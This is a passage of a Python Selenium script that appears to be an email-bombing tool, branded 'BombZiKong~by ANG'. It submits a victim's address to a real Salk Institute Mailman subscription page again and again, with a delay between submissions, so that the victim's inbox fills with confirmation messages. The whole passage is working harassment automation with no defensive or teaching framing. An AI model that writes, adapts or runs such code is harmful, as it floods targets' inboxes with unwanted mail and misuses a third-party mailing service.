pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
